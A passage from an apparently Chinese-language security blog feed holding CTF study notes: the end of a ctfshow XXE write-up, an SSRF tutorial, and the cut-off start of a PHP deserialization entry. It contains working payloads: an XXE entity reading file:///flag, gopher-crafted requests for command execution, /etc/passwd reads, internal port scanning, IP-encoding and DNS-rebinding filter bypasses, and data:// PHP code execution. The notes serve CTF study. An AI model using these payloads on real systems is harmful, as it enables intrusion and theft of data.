src="/../image/ctfshow-xxe-4.png"></p><p>一看就知道是xml数据，后台肯定会用xml解析这个数据</p><p>源码中也能看出来</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">doLogin</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-comment">//不为空就行</span><br><span class="hljs-keyword">var</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).val();<br><span class="hljs-keyword">var</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).val();<br><span class="hljs-keyword">if</span>(username == <span class="hljs-string">&quot;&quot;</span> || password == <span class="hljs-string">&quot;&quot;</span>)&#123;<br>alert(<span class="hljs-string">&quot;Please enter the username and password!&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">//定义一下数据</span><br><span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="hljs-string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="hljs-string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; <br>使用异步发送请求<br>    $.ajax(&#123;<br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>        <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;doLogin&quot;</span>,<br>        <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/xml;charset=utf-8&quot;</span>,<span class="hljs-comment">//告诉服务器我的数据类型</span><br>        data: data,<br>        <span class="hljs-attr">dataType</span>: <span class="hljs-string">&quot;xml&quot;</span>,<span class="hljs-comment">//接收的数据类型为</span><br>        anysc: <span class="hljs-literal">false</span>,<br>        <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">result</span>) &#123;<br>             从返回的 XML 数据中获取名为 <span class="hljs-string">&quot;code&quot;</span> 的元素的值。<br>        <span class="hljs-keyword">var</span> code = result.getElementsByTagName(<span class="hljs-string">&quot;code&quot;</span>)[<span class="hljs-number">0</span>].childNodes[<span class="hljs-number">0</span>].nodeValue;<br>        <span class="hljs-keyword">var</span> msg = result.getElementsByTagName(<span class="hljs-string">&quot;msg&quot;</span>)[<span class="hljs-number">0</span>].childNodes[<span class="hljs-number">0</span>].nodeValue;<br>        <span class="hljs-keyword">if</span>(code == <span class="hljs-string">&quot;0&quot;</span>)&#123;<br>        $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-built_in">text</span>(msg + <span class="hljs-string">&quot; login fail!&quot;</span>);<br>            <span class="hljs-comment">//如果code为1显示登录成功</span><br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(code == <span class="hljs-string">&quot;1&quot;</span>)&#123;<br>        $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-built_in">text</span>(msg + <span class="hljs-string">&quot; login success!&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>        $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-built_in">text</span>(<span class="hljs-string">&quot;error:&quot;</span> + msg);<br>        &#125;<br>        &#125;,<br><span class="hljs-comment">//在 AJAX 请求失败时执行 当发生错误时，会在页面上显示 errorThrown + &#x27;:&#x27; + textStatus，即显示异常信息和错误状态描述</span><br>        error: <span class="hljs-keyword">function</span> (<span class="hljs-params">XMLHttpRequest,textStatus,errorThrown</span>) &#123;<br>            $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-built_in">text</span>(errorThrown + <span class="hljs-string">&#x27;:&#x27;</span> + textStatus);<br>        &#125;<br>    &#125;); <br>&#125;<br></code></pre></td></tr></table></figure><p>contentType: “application&#x2F;xml;charset&#x3D;utf-8”,&#x2F;&#x2F;告诉服务器我的数据类型</p><p>X-Requested-With: XMLHttpRequest 这是告诉服务器我是ajax进行异步通信 数据可能是xml也可能是json(这俩大概率) 都有可能</p><p>发送的是xml数据 回来的也是xml数据(其实回来的不用管)服务器肯定是解析xml</p><p>发送之后发现还是有回显的。</p><p><img src="/../image/ctfshow-xxe-5.png"></p><p>payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">payload</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-symbol">&amp;xxe;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>admin<br><span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发送之后在bp和页面都可看到flag</p><p><img src="/../image/ctfshow-xxe-6.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> xxe </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf</title>
      <link href="/2025/03/16/ssrf/"/>
      <url>/2025/03/16/ssrf/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><a href="https://cloud.tencent.com/developer/article/2288231">SSRF全解</a></p><h2 id="SSRF漏洞原理"><a href="#SSRF漏洞原理" class="headerlink" title="SSRF漏洞原理"></a>SSRF漏洞原理</h2><h3 id="ssrf是什么"><a href="#ssrf是什么" class="headerlink" title="ssrf是什么"></a>ssrf是什么</h3><p><img src="/../image/ssrf-1.png"></p><h3 id="ssrf形成的原因以及攻击方式"><a href="#ssrf形成的原因以及攻击方式" class="headerlink" title="ssrf形成的原因以及攻击方式"></a>ssrf形成的原因以及攻击方式</h3><p><img src="/../image/ssrf-2.png"></p><p><img src="/../image/ssrf-3.png"></p><h3 id="ssrf漏洞利用"><a href="#ssrf漏洞利用" class="headerlink" title="ssrf漏洞利用"></a>ssrf漏洞利用</h3><p><img src="/../image/ssrf-4.png"></p><hr><h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">file:</span><span class="hljs-comment">//从文件系统中获取文件内容，如file://etc/passwd</span><br><span class="hljs-symbol">dict:</span><span class="hljs-comment">//字典服务协议，访问字典资源，如dict:///ip:6739/info:</span><br><span class="hljs-symbol">ftp:</span><span class="hljs-comment">//可用于网络端口扫描</span><br><span class="hljs-symbol">sftp:</span><span class="hljs-comment">//SSH文件传输协议或安全文件传输协议</span><br><span class="hljs-symbol">ldap:</span><span class="hljs-comment">//轻量级目录访问协议</span><br><span class="hljs-symbol">tftp:</span><span class="hljs-comment">//简单文件传输协议</span><br><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//分布式文档传递服务</span><br></code></pre></td></tr></table></figure><h2 id="File伪协议（查找内网存活主机IP）"><a href="#File伪协议（查找内网存活主机IP）" class="headerlink" title="File伪协议（查找内网存活主机IP）"></a>File伪协议（查找内网存活主机IP）</h2><p><strong>file:&#x2F;&#x2F; 从文件系统中获取文件内容，格式为 file:&#x2F;&#x2F;[文件路径]</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>passwd读取文件passwd<br><br>file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>hosts显示当前操作系统网卡的IP<br><br>file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/proc/</span>net/arp显示arp缓存表（寻找内网其他主机）<br><br>file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/proc/</span>net/fib_trie显示当前网段路由信息<br></code></pre></td></tr></table></figure><p><strong>file:&#x2F;&#x2F;proc&#x2F;net&#x2F;arp配合bp的intruder模块寻找内网其他主机</strong></p><p><img src="/../image/ssrf-5.png"></p><hr><h2 id="dict伪协议（-查找内网主机开放端口）"><a href="#dict伪协议（-查找内网主机开放端口）" class="headerlink" title="dict伪协议（ 查找内网主机开放端口）"></a>dict伪协议（ 查找内网主机开放端口）</h2><p>也可以使用ftp:&#x2F;&#x2F;但是效率较低</p><p>dict:&#x2F;&#x2F;字典服务协议，访问字典资源，如dict:&#x2F;&#x2F;ip:6739&#x2F;info:</p><p>可用于：扫描端口、获取内网信息、爆破密码等</p><p><strong>ftp伪协议配合bp的intruder模块查找内网主机开放端口</strong></p><p><img src="/../image/ssrf-6.png"></p><p><strong>dict伪协议配合bp集束炸弹攻击查找内网主机开放端口</strong></p><p><img src="/../image/ssrf-7.png"></p><p><strong>dict伪协议获取网站信息</strong></p><p><img src="/../image/ssrf-8.png"></p><hr><h2 id="HTTP伪协议（目录扫描）"><a href="#HTTP伪协议（目录扫描）" class="headerlink" title="HTTP伪协议（目录扫描）"></a>HTTP伪协议（目录扫描）</h2><p><strong>http伪协议</strong></p><p><img src="/../image/ssrf-9.png"></p><p><strong>http伪协议配合bp目录扫描获取网站子页面</strong></p><p><img src="/../image/ssrf-10.png"></p><hr><h2 id="gopher伪协议（重点）"><a href="#gopher伪协议（重点）" class="headerlink" title="gopher伪协议（重点）"></a>gopher伪协议（重点）</h2><p><strong>gopher伪协议</strong></p><p>利用范围较广：GET提交、POST提交、redis、Fastcgi、sql</p><p><strong>基本格式：</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">URL</span><span class="hljs-symbol">:gopher</span><span class="hljs-symbol">://&lt;host&gt;</span><span class="hljs-symbol">:&lt;port&gt;/&lt;gopher-path&gt;</span><br></code></pre></td></tr></table></figure><p>web也需要加端口号80</p><p>gopher协议默认端口为70</p><hr><p><strong>gopher请求不转发第一个字符：</strong></p><p>所以需要使用下划线填充首位</p><p><img src="/../image/ssrf-11.png"></p><h3 id="gopher伪协议GET提交以及POST提交"><a href="#gopher伪协议GET提交以及POST提交" class="headerlink" title="gopher伪协议GET提交以及POST提交"></a>gopher伪协议GET提交以及POST提交</h3><p><strong>GET提交：直接提交就能执行</strong></p><p><img src="/../image/ssrf-12.png"></p><p><strong>POST提交：要使用gopher伪协议</strong></p><p><img src="/../image/ssrf-13.png"></p><h4 id="gopher伪协议GET提交"><a href="#gopher伪协议GET提交" class="headerlink" title="gopher伪协议GET提交"></a>gopher伪协议GET提交</h4><p><strong>需要保留两个头部信息，而且在GET提交头部信息之后必须要加一个换行符</strong></p><p>浏览器提交</p><p><img src="/../image/ssrf-14.png"></p><p>bp请求包提交</p><p><img src="/../image/ssrf-15.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.4:80</span>/_GET%<span class="hljs-number">20</span>/name.php%<span class="hljs-number">3</span>fname=benben%<span class="hljs-number">20</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>AHOST:%<span class="hljs-number">20172</span>.<span class="hljs-number">250</span>.<span class="hljs-number">250</span>.<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure><p><strong>注意：</strong></p><p><strong>如果要成功提交，需要进行两次url编码，因为ssrf主机会帮我们解码一次，然后再目标内网主机又会解码一次。所以如果要在bp添加gopher伪协议，需要进行两次url编码</strong></p><p><strong>如果在浏览器上的话只需要一次，因为浏览器会帮我们编码一次，我们自己编码一次。</strong></p><h4 id="gopher伪协议POST提交"><a href="#gopher伪协议POST提交" class="headerlink" title="gopher伪协议POST提交"></a>gopher伪协议POST提交</h4><p><strong>需要保留四个头部信息，且长度需要与实际长度对应</strong></p><p><img src="/../image/ssrf-16.png"></p><p><strong>在bp重放器里先进行两次url编码，然后再放到gopher伪协议后面然后提交</strong></p><p><img src="/../image/ssrf-17.png"></p><p><img src="/../image/ssrf-18.png"></p><p><strong>使用插件HackBar进行POST提交</strong></p><p><img src="/../image/ssrf-19.png"></p><p>建议先写好gopher伪协议的固定格式然后抓包，再进行构造头部信息以及编码</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//172.250.250.4:80/_</span><br></code></pre></td></tr></table></figure><hr><h2 id="SSRF之环回地址绕过"><a href="#SSRF之环回地址绕过" class="headerlink" title="SSRF之环回地址绕过"></a>SSRF之环回地址绕过</h2><p>比赛中经常限制访问本地网站的某些内容</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$_SEVER[<span class="hljs-string">&#x27;REMOTE_ADD&#x27;</span>]==<span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br></code></pre></td></tr></table></figure><p>看到REMOTE_ADD地址是127.0.0.1时才会显示</p><p>而’127.0.0.1’会被限制</p><p>可将’127.0.0.1’变形显示</p><hr><p><strong>ip地址</strong></p><p><img src="/../image/ssrf-20.png"></p><p>将127.0.0.1替换为其他进制的表达方式来绕过过滤</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<br>八进制<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">017700000001</span><span class="hljs-regexp">/flag.php点分式http:/</span><span class="hljs-regexp">/0177.0000.0000.0001/</span>flag.php<br><br>十六进制<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>x7F000001<span class="hljs-regexp">/flag.phphttp:/</span><span class="hljs-regexp">/0x7F.0x00.0x00.0x01/</span>flag.phphttp:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>x7F.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span>/flag.php<br><br>十进制<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">2130706433</span>/flag.php<br></code></pre></td></tr></table></figure><hr><h2 id="SSRF之302重定向绕过"><a href="#SSRF之302重定向绕过" class="headerlink" title="SSRF之302重定向绕过"></a>SSRF之302重定向绕过</h2><p>302重定向主要是绕过针对私网地址被限制的情况</p><h3 id="302重定向原理："><a href="#302重定向原理：" class="headerlink" title="302重定向原理："></a>302重定向原理：</h3><p><img src="/../image/ssrf-21.png"></p><p>具体实现：</p><p><img src="/../image/ssrf-22.png"></p><p>我们需要有一台有公网IP的服务器，然后进行域名解析的WEB服务，然后构建302重定向代码，</p><p>具体步骤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">在有公网的服务器linux系统下<br><span class="hljs-comment">#index.php</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:http://127.0.0.1/flag.php&#x27;</span>);<br><br>开启web服务<br>php -S <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">7777</span><br><br><br>ssrf服务器访问<br>http:<span class="hljs-comment">//公网ip:7777/index.php</span><br><br>成功执行<span class="hljs-number">302</span>重定向<br></code></pre></td></tr></table></figure><hr><h2 id="SSRF之添加-绕过"><a href="#SSRF之添加-绕过" class="headerlink" title="SSRF之添加@绕过"></a>SSRF之添加@绕过</h2><p>平常我们传入的url是<code>url=http://127.0.0.1</code>，如果 我们传入的url是<code>url=http://quan9i@127.0.0.1</code>,它此时依旧会访问127.0.0.1</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">例如：<br><span class="hljs-symbol">http:</span>//jasmineaura.github.io<span class="hljs-subst">@127</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure><hr><h2 id="SSRF之DNS重绑定绕过"><a href="#SSRF之DNS重绑定绕过" class="headerlink" title="SSRF之DNS重绑定绕过"></a>SSRF之DNS重绑定绕过</h2><p><strong>针对SSRF漏洞的防御</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 解析目标URL，获取其Host<br><span class="hljs-bullet">2.</span> 解析Host，获取Host指向的IP地址<br><span class="hljs-bullet">3.</span> 检查IP地址是否为内网地址<br><span class="hljs-bullet">4.</span> 请求URL<br><span class="hljs-bullet">5.</span> 如果有跳转，拿出跳转URL，执行1<br></code></pre></td></tr></table></figure><p>可以有效限制：直接访问内网IP；302跳转；xip.io&#x2F;xip.name 及短链接变换等URL变形；</p><p>畸形URL；iframe攻击；IP进制变换</p><p><strong>针对这种防御可以使用DNS Rebinding Attack（DNS重绑定攻击）</strong></p><hr><h3 id="DNS重绑定攻击原理"><a href="#DNS重绑定攻击原理" class="headerlink" title="DNS重绑定攻击原理"></a><strong>DNS重绑定攻击原理</strong></h3><p><a href="https://lock.cmpxchg8b.com/rebinder.html">DNS重绑定网站TTL值为0</a></p><p>设置A为公网IP，B为私网IP</p><p><img src="/../image/ssrf-23.png"></p><p><img src="/../image/ssrf-24.png"></p><p><img src="/../image/ssrf-25.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs armasm">设置一个合法<span class="hljs-built_in">IP</span>为A设置<span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>公网<span class="hljs-built_in">IP</span>为<span class="hljs-keyword">B</span><br>生成DNS解析<br><span class="hljs-symbol">df657038.7f000001.rbndr.us</span><br><br>访问<br><span class="hljs-symbol">http:</span><span class="hljs-comment">//df657038.7f000001.rbndr.us/flag.php</span><br></code></pre></td></tr></table></figure><h2 id="使用SSRF-GET提交命令执行"><a href="#使用SSRF-GET提交命令执行" class="headerlink" title="使用SSRF GET提交命令执行"></a>使用SSRF GET提交命令执行</h2><p>例如：</p><p>使用shell.php页面GET方法传值进行命令执行</p><p><img src="/../image/ssrf-26.png"></p><hr><p>使用gopher伪协议进行命令执行</p><p><img src="/../image/ssrf-27.png"></p><p>构造gopher伪协议命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">首先在输入框中输入<br>gopher://172.250.250.4:80/_<br><br>然后抓包构造header poc<br>GET /shell.php?cmd=<span class="hljs-built_in">id</span> HTTP/1.1<br>Host: 172.250.250.4<br><br>注意还有个换行符<br>然后进行两次url编码接在gopher伪协议之后<br></code></pre></td></tr></table></figure><p><img src="/../image/ssrf-28.png"></p><h2 id="使用SSRF-POST提交命令执行"><a href="#使用SSRF-POST提交命令执行" class="headerlink" title="使用SSRF POST提交命令执行"></a>使用SSRF POST提交命令执行</h2><p>前期依旧是使用file伪协议和dict伪协议、http伪协议查找内网存活主机IP和内网主机开放端口并且扫描目录，查找可利用的页面</p><p>使用gopher伪协议进行POST提交</p><p><img src="/../image/ssrf-29.png"></p><p><img src="/../image/ssrf-30.png"></p><p>POST提交命令执行拿到flag，还是注意构造好header poc，长度要对应</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">id</span><span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-comment">;cat+flag</span><br></code></pre></td></tr></table></figure><p><img src="/../image/ssrf-31.png"></p><hr><h2 id="使用SSRF进行XXE漏洞利用"><a href="#使用SSRF进行XXE漏洞利用" class="headerlink" title="使用SSRF进行XXE漏洞利用"></a>使用SSRF进行XXE漏洞利用</h2><p>XXE漏洞实例：</p><p><img src="/../image/ssrf-32.png"></p><p><img src="/../image/ssrf-33.png"></p><p>构造payload：</p><p><img src="/../image/ssrf-34.png"></p><p>然后使用gopher伪协议进行提交<br><img src="/../image/ssrf-35.png"></p><hr><h2 id="使用SSRF进行sql注入漏洞"><a href="#使用SSRF进行sql注入漏洞" class="headerlink" title="使用SSRF进行sql注入漏洞"></a>使用SSRF进行sql注入漏洞</h2><p>1、使用http伪协议获取信息</p><p>2、sql注入</p><p>实例：</p><p>路径</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>sql注入代码</p><p><img src="/../image/ssrf-36.png"></p><p>浏览器直接提交</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">http:<span class="hljs-comment">//172.250.250.11/Less-1/?id=1&#x27;--%20</span><br><br>注意：<br>这里--之后应该用<span class="hljs-meta">%</span><span class="hljs-number">20</span>而不是+，空格必须先url编码一次变成<span class="hljs-meta">%</span><span class="hljs-number">20</span><br>如果在hackbar中则需要进行两次url编码<br></code></pre></td></tr></table></figure><h3 id="sql注入GET提交"><a href="#sql注入GET提交" class="headerlink" title="sql注入GET提交"></a><strong>sql注入GET提交</strong></h3><p><img src="/../image/ssrf-37.png"></p><hr><h3 id="sql注入POST提交"><a href="#sql注入POST提交" class="headerlink" title="sql注入POST提交"></a><strong>sql注入POST提交</strong></h3><p><img src="/../image/ssrf-38.png"></p><p><img src="/../image/ssrf-39.png"></p><p>构造payload并使用gopher伪协议提交<br><img src="/../image/ssrf-40.png"></p><p>替换查找内容，以及字符串长度</p><hr><h2 id="使用SSRF进行文件上传漏洞"><a href="#使用SSRF进行文件上传漏洞" class="headerlink" title="使用SSRF进行文件上传漏洞"></a>使用SSRF进行文件上传漏洞</h2><h3 id="multipart-form-data的定义"><a href="#multipart-form-data的定义" class="headerlink" title="multipart&#x2F;form-data的定义"></a><strong>multipart&#x2F;form-data的定义</strong></h3><p><img src="/../image/ssrf-41.png"></p><p>文件上传漏洞实例：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.14</span>/Pass-<span class="hljs-number">01</span>/index.php<br></code></pre></td></tr></table></figure><p>先查看源码：</p><p><img src="/../image/ssrf-42.png"></p><p>请求头，需要指定边界</p><p><img src="/../image/ssrf-43.png"></p><h3 id="构造gohper提交数据"><a href="#构造gohper提交数据" class="headerlink" title="构造gohper提交数据"></a>构造gohper提交数据</h3><p><img src="/../image/ssrf-44.png"></p><p>这里分隔符可以自定义。并且最后还需要结束符号</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">分隔符格式</span><br><span class="hljs-literal">--</span><span class="hljs-comment">分隔符</span><br><br><span class="hljs-comment">结束分隔符</span><br><span class="hljs-literal">--</span><span class="hljs-comment">自定义分隔符</span><span class="hljs-literal">--</span><br></code></pre></td></tr></table></figure><h3 id="使用gopher伪协议提交"><a href="#使用gopher伪协议提交" class="headerlink" title="使用gopher伪协议提交"></a>使用gopher伪协议提交</h3><p><img src="/../image/ssrf-45.png"></p><hr><h2 id="使用SSRF进行文件包含漏洞利用"><a href="#使用SSRF进行文件包含漏洞利用" class="headerlink" title="使用SSRF进行文件包含漏洞利用"></a>使用SSRF进行文件包含漏洞利用</h2><p>例如</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://172.250.250.14/include.php?file=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>system(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">执行data://伪协议命令执行空格用%20代替</span><br><span class="language-xml"></span><br><span class="language-xml">http://172.250.250.14/include.php?file=file:///etc/passwd</span><br><span class="language-xml">执行file://伪协议读取文件</span><br><span class="language-xml"></span><br><span class="language-xml">http://172.250.250.14/include.php?file=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">执行data://伪协议代码执行空格用%20代替</span><br></code></pre></td></tr></table></figure><p>gopher伪协议ssrf和之前的几个漏洞差不多</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-php序列化</title>
      <link href="/2025/03/14/ctfshow-php%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/03/14/ctfshow-php%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfshow-php反序列化"><a href="#ctfshow-php反序列化" class="headerlink" title="ctfshow-php反序列化"></a>ctfshow-php反序列化</h1><h2 id="web-254"><a href="#web-254" class="headerlink" title="web-254"></a>web-254</h2><p>先看题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 